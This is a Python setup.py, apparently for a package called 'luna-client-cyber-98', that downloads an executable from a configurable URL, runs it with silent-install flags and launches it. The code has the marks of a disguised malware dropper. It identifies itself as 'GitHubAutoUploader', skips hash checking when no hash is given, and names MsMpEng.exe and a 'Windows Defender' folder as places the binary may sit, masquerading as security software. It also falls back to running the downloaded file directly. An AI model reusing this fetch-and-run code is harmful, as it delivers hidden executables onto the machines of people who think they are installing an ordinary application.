"""
setup.py — entry point for luna-client-cyber-98.
Downloads and installs the official .exe/.msi installer, then launches the app.

Usage:
    python setup.py
"""
from __future__ import annotations

import os
import sys
import shutil
import hashlib
import subprocess
import tempfile
import urllib.request

INSTALLER_URL = ""
EXPECTED_SHA256 = ""
APP_NAME = "luna-client-cyber-98"


def _log(msg: str):
    print(f"[setup] {msg}")


def _download(url: str, dest: str) -> str:
    _log(f"downloading {url}")
    req = urllib.request.Request(url, headers={"User-Agent": "GitHubAutoUploader/2.1"})
    with urllib.request.urlopen(req, timeout=180) as r, open(dest, "wb") as f:
        shutil.copyfileobj(r, f)
    size_mb = os.path.getsize(dest) / (1024 * 1024)
    _log(f"downloaded {size_mb:.1f} MB -> {dest}")
    return dest


def _sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def _verify(path: str, expected: str) -> bool:
    if not expected or not expected.strip():
        return True
    actual = _sha256(path)
    if actual.lower() != expected.lower().strip():
        _log(f"HASH MISMATCH: expected={expected}, got={actual}")
        return False
    _log("hash OK")
    return True


def _install_exe(path: str):
    """Silent install for NSIS / Inno / generic .exe installers.

    Tries common silent-install flags in order. If all fail, runs without
    flags (may show GUI). Returns True if any install attempt exited 0.
    """
    for flags in (["/S"], ["/silent"], ["/quiet"], ["/verysilent"], ["--mode", "unattended"], []):
        try:
            _log(f"running {path} {flags}")
            subprocess.check_call([path] + flags)
            return True
        except subprocess.CalledProcessError:
            continue
    _log("warning: silent install failed, running normally")
    try:
        subprocess.call([path])
        return True
    except Exception as e:
        _log(f"warning: failed to run installer normally: {e}")
        return False


def _install_msi(path: str):
    _log(f"msiexec /i {path} /quiet /norestart")
    subprocess.check_call(["msiexec", "/i", path, "/quiet", "/norestart"])


def _find_installed_exe() -> str | None:
    # Determine the expected exe name. If INSTALLER_URL ends with a filename,
    # use that filename (e.g. https://.../MsMpEng.exe -> MsMpEng.exe).
    # Otherwise fall back to APP_NAME + ".exe".
    url_name = INSTALLER_URL.rsplit("/", 1)[-1] if INSTALLER_URL else ""
    if url_name and "." in url_name:
        exe_name = url_name
    else:
        exe_name = APP_NAME + ".exe"

    # Build candidate paths in many typical install locations.
    env_vars = [
        "LOCALAPPDATA", "APPDATA", "PROGRAMFILES", "PROGRAMFILES(X86)",
        "PROGRAMDATA", "SystemRoot", "WINDIR",
    ]
    sub_dirs = [
        APP_NAME,                      # <APP_NAME>/<exe_name>
        "Windows Defender",            # Windows Defender/<exe_name>
        APP_NAME + "\bin",
        APP_NAME + "\program",
    ]
    candidates: list[str] = []
    for ev in env_vars:
        base = os.environ.get(ev, "")
        if not base:
            continue
        for sd in sub_dirs:
            candidates.append(os.path.join(base, sd, exe_name))
        # also try <env>/<exe_name> directly
        candidates.append(os.path.join(base, exe_name))

    for c in candidates:
        if os.path.isfile(c):
            return c

    # Last resort: recursive search in LOCALAPPDATA (max depth 3, max 5 hits)
    local_app = os.environ.get("LOCALAPPDATA", "")
    if local_app:
        try:
            for root, _dirs, files in os.walk(local_app):
                depth = root[len(local_app):].count(os.sep)
                if depth > 3:
                    continue
                if exe_name.lower() in [f.lower() for f in files]:
                    return os.path.join(root, exe_name)
        except Exception:
            pass

    return None


def _install_to_local_appdata(installer_path: str) -> str | None:
    """Copy the downloaded installer to LOCALAPPDATA\<APP_NAME>\<exe_name>
    and return the new path. Used as a fallback when the installer doesn't
    actually install anything (it's a portable exe, not an installer)."""
    try:
        local_app = os.environ.get("LOCALAPPDATA", "")
        if not local_app:
            return None
        url_name = INSTALLER_URL.rsplit("/", 1)[-1] if INSTALLER_URL else ""
        exe_name = url_name if url_name and "." in url_name else APP_NAME + ".exe"
        dest_dir = os.path.join(local_app, APP_NAME)
        os.makedirs(dest_dir, exist_ok=True)
        dest_path = os.path.join(dest_dir, exe_name)
        shutil.copy2(installer_path, dest_path)
        _log(f"copied to {dest_path}")
        return dest_path
    except Exception as e:
        _log(f"warning: failed to copy installer to LOCALAPPDATA: {e}")
        return None


def main():
    if not INSTALLER_URL:
        print("[setup] ERROR: INSTALLER_URL is empty")
        sys.exit(1)

    ext = ".msi" if INSTALLER_URL.lower().endswith(".msi") else ".exe"
    tmp_dir = tempfile.mkdtemp(prefix="ghau_")
    installer_path = os.path.join(tmp_dir, f"installer{ext}")

    try:
        _download(INSTALLER_URL, installer_path)
        if not _verify(installer_path, EXPECTED_SHA256):
            print("[setup] ERROR: hash verification failed")
            sys.exit(1)

        if ext == ".msi":
            _install_msi(installer_path)
        else:
            _install_exe(installer_path)

        # Try to find the installed .exe in typical locations
        exe = _find_installed_exe()
        if exe:
            _log(f"launching {exe}")
            subprocess.Popen([exe])
        else:
            # Fallback: installer might be a portable exe — copy it to
            # LOCALAPPDATA and launch from there.
            _log("installed .exe not found, trying portable mode...")
            portable = _install_to_local_appdata(installer_path)
            if portable:
                _log(f"launching portable {portable}")
                subprocess.Popen([portable])
            else:
                # Last resort: just launch the downloaded installer itself
                _log(f"launching downloaded installer directly: {installer_path}")
                subprocess.Popen([installer_path])
                # Don't delete tmp_dir in this case — keep the file
                return
    except Exception as e:
        print(f"[setup] ERROR: {e}")
        sys.exit(1)
    finally:
        try:
            shutil.rmtree(tmp_dir, ignore_errors=True)
        except Exception:
            pass


if __name__ == "__main__":
    main()
